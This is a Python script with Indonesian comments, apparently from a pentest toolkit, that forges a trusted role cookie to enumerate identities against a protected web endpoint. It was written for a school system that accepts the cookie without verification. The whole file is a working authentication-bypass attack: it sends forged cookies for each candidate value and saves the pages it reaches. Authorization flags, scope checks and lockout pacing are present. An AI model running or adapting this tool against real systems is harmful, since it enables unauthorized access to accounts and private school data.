#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""forge_cookie.py — enumerasi identitas via Cookie inject (bypass client-side auth).

Kasus sekolah: cookie role=... ternyata dipercaya server/gas tanpa verifikasi —
cuma 1 guru yang kepakai karena cuma dia yang pernah login (cookie-nya bocor).
Modul ini menebak nilai cookie valid untuk SEMUA identitas, dengan pacing anti-lockout.

    python3 forge_cookie.py --url https://.../exec \
        --cookie-name role --values guru1,guru2,guru3
    python3 forge_cookie.py --url ... --cookie-name role \
        --values-file users.txt --fail-sig "masuk,password,salah" --pace 2

Kandidat lolos = respons TIDAK memuat fail-signature & bukan halaman login.
Bukti disimpan per kandidat → package laporan.
"""
from __future__ import annotations

import argparse
import pathlib
import sys
import urllib.parse

sys.path.insert(0, str(pathlib.Path(__file__).parent))
from kit_common import (http_get, outdir, pace_sleep, save_json,  # noqa: E402
                        scope_check, summary)

DEF_FAIL = "masuk,password,kata sandi,salah,login,sign in"
MAX_VALUES = 60  # batas keras anti-lockout


def evaluate(status: int, final_url: str, body: str, fail_sigs: list[str],
             ok_sig: str) -> tuple[bool, str]:
    low = body.lower()
    if "accounts.google.com" in final_url or "/ServiceLogin" in final_url:
        return False, "redirect login google"
    if any(s in low for s in fail_sigs):
        return False, "fail-signature ada"
    if ok_sig and ok_sig.lower() not in low:
        return False, f"ok-signature '{ok_sig}' tidak ada"
    if status >= 400:
        return False, f"HTTP {status}"
    if len(body) < 40:
        return False, "body kosong"
    return True, f"lolos ({status}, {len(body)} B)"


def main() -> int:
    ap = argparse.ArgumentParser(description="enumerasi identitas via cookie forge")
    ap.add_argument("--url", required=True, help="endpoint terproteksi (…/exec)")
    ap.add_argument("--cookie-name", required=True)
    ap.add_argument("--values", help="kandidat dipisah koma")
    ap.add_argument("--values-file", help="satu kandidat per baris")
    ap.add_argument("--set-cookie", default="",
                    help="cookie tambahan tetap (mis. 'sid=abc; theme=dark')")
    ap.add_argument("--fail-sig", default=DEF_FAIL,
                    help="gegagalan dipisah koma (default: halaman login)")
    ap.add_argument("--ok-sig", default="",
                    help="frasa tanda KUNCI berhasil (mis. 'Data Guru'/'dashboard')")
    ap.add_argument("--pace", type=float, default=2.0)
    ap.add_argument("--max", type=int, default=MAX_VALUES)
    ap.add_argument("--timeout", type=float, default=45.0)
    ap.add_argument("--authorized", action="store_true",
                    help="aku punya izin tertulis utk target ini")
    ap.add_argument("--scope", default=None)
    ap.add_argument("--out", default="cookie_forge")
    a = ap.parse_args()

    kw = {"authorized": a.authorized}
    if a.scope:
        kw["scope_path"] = a.scope
    scope_check(a.url, **kw)

    vals: list[str] = []
    if a.values:
        vals += [v.strip() for v in a.values.split(",") if v.strip()]
    if a.values_file:
        vals += [v.strip() for v in pathlib.Path(a.values_file)
                 .read_text().splitlines() if v.strip() and not v.startswith("#")]
    if not vals:
        ap.error("butuh --values atau --values-file")
    if len(vals) > a.max:
        print(f"[!] {len(vals)} kandidat > max {a.max} — dipotong (anti-lockout).")
        vals = vals[:a.max]

    fail_sigs = [s.strip().lower() for s in a.fail_sig.split(",") if s.strip()]
    d = outdir("forge", a.out)
    base_cookie = (a.set_cookie + "; ") if a.set_cookie else ""
    results, hits = [], []

    print(f"[*] {len(vals)} kandidat × pace {a.pace}s = ±{len(vals) * a.pace:.0f}s")
    for v in vals:
        cookie = f"{base_cookie}{a.cookie_name}={urllib.parse.quote(str(v))}"
        try:
            status, hdr, body, final = http_get(a.url, cookie, a.timeout)
            ok, note = evaluate(status, final, body, fail_sigs, a.ok_sig)
        except Exception as e:
            ok, note, status, final, body = False, f"err {e}", 0, "", ""
        mark = "[✓]" if ok else "[✗]"
        print(f"  {mark} {a.cookie_name}={v:<20} {note}")
        rec = {"value": v, "cookie": cookie, "ok": ok, "note": note,
               "status": status, "final": final}
        results.append(rec)
        if ok:
            hits.append(rec)
            (d / f"hit_{v}.html").write_text(body)
        pace_sleep(a.pace)

    save_json(d / "results.json", results)
    (d / "README.txt").write_text(
        "Bukti cookie-forge enumeration (aktiv, pacing dilakukan sesuai aturan).\n"
        + "\n".join(f"{r['value']}: {r['note']}" for r in results) + "\n")
    summary("cookie forge",
            [("kandidat", len(vals)), ("lolos", len(hits)),
             ("gagal", len(vals) - len(hits))])
    if hits:
        print("[!] IDENTITAS KETEMU:")
        for h in hits:
            print(f"    {a.cookie_name}={h['value']}  → {d}/hit_{h['value']}.html")
    print(f"[✓] {d}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
